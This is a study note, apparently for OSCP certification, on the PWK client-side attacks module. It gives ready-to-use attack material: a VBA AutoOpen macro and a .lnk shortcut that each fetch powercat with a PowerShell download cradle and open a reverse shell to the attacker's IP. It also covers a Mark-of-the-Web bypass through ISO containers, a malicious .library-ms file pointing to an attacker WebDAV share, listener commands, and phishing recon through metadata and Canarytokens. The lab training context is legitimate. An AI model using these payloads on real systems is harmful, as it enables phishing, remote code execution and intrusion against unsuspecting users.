---
title: "PWK Module 12 - Client-Side Attacks"
created: "2026-04-05"
source: "PEN-200 PWK Course (OffSec 2025)"
type: reference-note
status: active
tags:
  - oscp
  - client-side
  - office-macros
  - windows-library
  - motw
  - pwk
  - reference
  - module-12
---

# Module 12 — Client-Side Attacks

> **OSCP Exam Relevance:** Client-side attacks are the bridge between phishing and getting a shell. When you can't exploit a service directly, you send a payload to a user and wait for them to execute it. The Windows Library file + WebDAV chain is a high-value technique — it bypasses AV, looks legitimate, and works reliably in AD environments.

**Learning Units Covered:**
- 12.1 Target Reconnaissance (metadata, fingerprinting)
- 12.2 Exploiting Microsoft Office (macros, MotW)
- 12.3 Abusing Windows Library Files (WebDAV + shortcut chain)

---

## 12.1 Target Reconnaissance

### 12.1.1 Metadata Analysis

Files published by a target (PDFs, Word docs, images) often contain **metadata** that reveals usernames, software versions, internal paths, and author names — useful for spear phishing and AD enumeration.

```bash
# Extract all metadata from a PDF (or any file)
exiftool -a -u brochure.pdf
```

**Key metadata fields to look for:**

| Field | Value | Use |
|-------|-------|-----|
| Author | Stanley Yelnats | Real username → AD login attempt |
| Creator | Microsoft PowerPoint 365 | Software version → CVE lookup |
| Create Date | 2022:04:27 | Timeline intelligence |
| Producer | Microsoft® PowerPoint® for Microsoft 365 | Office version |

```bash
# Google dork to find public documents from a target
# site:example.com filetype:pdf
# site:example.com filetype:docx

# Then download and extract metadata from all results
gobuster dir -u http://target.com -x pdf,docx,xlsx
exiftool -a -u *.pdf
```

**Example output from real PWK lab:**
```
Creator         : Stanley Yelnats
Title           : Mountain Vegetables
Producer        : Microsoft® PowerPoint® for Microsoft 365
Create Date     : 2022:04:27 07:34:01+02:00
```
→ Username `stanleyyelnats` or `syelnats` → try against AD

### 12.1.2 Client Fingerprinting with Canarytokens

When you send a phishing link, **Canarytokens** lets you capture detailed victim browser/system information before they even interact with your payload.

**How it works:**
1. Go to [canarytokens.org](https://canarytokens.org/nest/)
2. Select **Web bug / URL token**
3. Enter webhook URL or email for alerts
4. Add comment: "Fingerprinting"
5. Click **Create my Canarytoken**
6. Embed the generated URL in your phishing email

**What you get when victim clicks:**
- IP address and geolocation
- Browser type and version
- OS and OS version
- Screen resolution
- Timestamp

> 💡 **OSCP use:** Confirms the target clicked your link. Gives you OS/browser details to tailor your payload (e.g., Windows 10 → try specific Office macro; Linux → try different vector).

---

## 12.2 Exploiting Microsoft Office

### 12.2.1 Mark of the Web (MotW)

**What MotW is:** When Windows downloads a file from the internet, it tags it with a `Zone.Identifier` Alternate Data Stream (NTFS ADS) — the "Mark of the Web." Office reads this tag and **blocks macros** in MOTW-tagged files.

```
Internet download → NTFS ADS Zone.Identifier added → Office sees MotW → macros blocked
```

**Why this matters:** Since 2022, Microsoft disabled the "Enable Content" button for MOTW files — users can no longer one-click enable macros on downloaded documents.

### 12.2.2 MotW Bypass via Container Formats

**The bypass:** FAT32 filesystems (used inside ISO, IMG, 7z containers) **do not support NTFS ADS** — so `Zone.Identifier` cannot be stored. Files extracted from these containers **do not receive MotW**.

```
Phishing email → ISO attachment → victim double-clicks → mounts as drive
→ extracts .docm file → NO MotW → macros execute without prompt
```

**Container formats that bypass MotW:**
- `.iso` — most reliable; Windows auto-mounts on double-click
- `.img` — disk image; same behavior
- `.7z` — compressed archive; extraction strips MotW

```bash
# Create ISO containing your malicious document (on Kali)
mkisofs -o payload.iso -J -R /path/to/folder/with/macro_doc/

# Or use xorriso
xorriso -as mkisofs -o payload.iso /path/to/folder/
```

### 12.2.3 Office Macro Basics (VBA)

Office macros run **Visual Basic for Applications (VBA)** code when a document is opened (AutoOpen) or when a workbook opens (Workbook_Open).

**Simple macro reverse shell via PowerShell download cradle:**

```vba
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -c ""IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/powercat.ps1'); powercat -c YOUR_IP -p 4444 -e powershell"""
End Sub
```

**To embed in a Word document:**
1. Open Word → View → Macros → Create
2. Paste VBA code
3. Save as `.docm` (macro-enabled)
4. Deliver via ISO container (bypass MotW)

> ⚠️ **AV detection:** Most AV solutions flag macros with `WScript.Shell` + PowerShell cradles. For real engagements, obfuscate. For OSCP labs, often works as-is.

---

## 12.3 Abusing Windows Library Files

### 12.3.1 What Are Windows Library Files?

Windows Library files (`.library-ms`) are XML configuration files that tell Windows Explorer to display a **virtual folder** aggregating content from multiple locations — including network shares (WebDAV, SMB).

**The attack:** Craft a `.library-ms` file pointing to your attacker-controlled WebDAV share. When the victim opens it, Windows Explorer connects to your share and displays contents. If you've placed a malicious shortcut (`.lnk`) in the share, the victim sees it and clicks it → code execution.

### 12.3.2 Setting Up WebDAV Server

**Tool:** WsgiDAV — Python-based WebDAV server, runs on Kali

```bash
# Install
sudo apt install pipx -y
pipx ensurepath
pipx install wsgidav

# Create share directory
mkdir ~/webdav

# Start WsgiDAV (anonymous access, port 80)
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/
```

**Verification:**
```
INFO: WsgiDAV/4.0.1 Python/3.9.10 Linux-...
INFO: Serving on http://0.0.0.0:80
```

### 12.3.3 Creating the Library File

**Create `config.Library-ms`** (XML file — open in VS Code or any text editor):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://YOUR_KALI_IP</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

**Key field:** `<url>http://YOUR_KALI_IP</url>` — points to your WebDAV share

> 💡 **Note:** After saving and reopening, Windows modifies the `url` tag to `\\YOUR_IP\DavWWWRoot` and adds a `<serialized>` tag with base64 — this is normal Windows WebDAV client optimization.

### 12.3.4 Creating the Malicious Shortcut (.lnk)

The shortcut in your WebDAV share runs a PowerShell download cradle → executes Powercat reverse shell.

**Create shortcut on Windows:**
1. Right-click Desktop → New → Shortcut
2. Location: (paste this entire command)
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/powercat.ps1'); powercat -c YOUR_KALI_IP -p 4444 -e powershell"
```
3. Name: `automatic_configuration` (looks like a legitimate IT config tool)
4. Copy `automatic_configuration.lnk` to your WebDAV share directory (`~/webdav/`)

### 12.3.5 Full Attack Execution

**On Kali — set up listeners:**

```bash
# Terminal 1: Python HTTP server serving powercat.ps1
cd /usr/share/powershell-empire/empire/server/data/module_source/management/
python3 -m http.server 8000

# Terminal 2: Netcat listener for reverse shell
nc -nvlp 4444

# Terminal 3: WsgiDAV (already running)
```

**Deliver the Library file to victim:**

Option A — Email it directly (`.library-ms` is not commonly blocked)

Option B — Upload to SMB share on target:
```bash
cd ~/webdav
smbclient //TARGET_IP/share -c 'put config.Library-ms'
```

**What happens on victim's machine:**
1. Victim double-clicks `config.Library-ms`
2. Windows Explorer opens and connects to your WebDAV share
3. Victim sees `automatic_configuration.lnk` in Explorer
4. Victim double-clicks the shortcut
5. PowerShell executes → downloads `powercat.ps1` → connects back to your listener

**Incoming shell:**
```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
hr137\hsmith
```

### 12.3.6 Why This Bypasses Defenses

| Defense | Why it's bypassed |
|---------|-------------------|
| Email AV (attachment scan) | `.library-ms` is XML, not an executable — not flagged |
| MotW | Library file doesn't execute code directly; the WebDAV content loads fresh |
| Macro blocking | No macros involved — uses PowerShell shortcut |
| AppLocker (basic) | PowerShell is a signed MS binary — often allowed |

---

## Attack Flow Comparison

| Technique | Delivery | Execution | Prerequisites |
|-----------|----------|-----------|---------------|
| Office Macro | `.docm` in ISO | VBA AutoOpen | Victim opens doc |
| Windows Library | `.library-ms` via email/SMB | Click `.lnk` in Explorer | Victim opens library file, then clicks shortcut |
| Phishing link (Module 11) | Email link | Browser → credential form | Victim fills in form |

---

## Quick Reference — Key Commands

```bash
# Metadata extraction
exiftool -a -u target.pdf

# Install and run WebDAV
pipx install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/

# Serve powercat
cd /usr/share/powershell-empire/empire/server/data/module_source/management/
python3 -m http.server 8000

# Netcat listener
nc -nvlp 4444

# Upload library file via SMB
smbclient //TARGET_IP/share -c 'put config.Library-ms'

# PowerShell shortcut payload
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8000/powercat.ps1'); powercat -c KALI_IP -p 4444 -e powershell"
```

---

## Connections

- [[PWK-Module-11-Phishing-Basics]] — previous module; delivery mechanism for these payloads
- [[PWK-Module-13-Locating-Public-Exploits]] — next module
- [[Windows-Library-WebDAV-Attack-Chain]] — permanent note on the full chain
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [HackTricks - Windows Library Files](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [WsgiDAV Documentation](https://wsgidav.readthedocs.io/)
- [Canarytokens](https://canarytokens.org/nest/) — client fingerprinting
- [IppSec](https://www.youtube.com/@ippsec) — search "client side", "macro", "library"
- [PayloadsAllTheThings - Office](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Phishing%20-%20Malicious%20files)
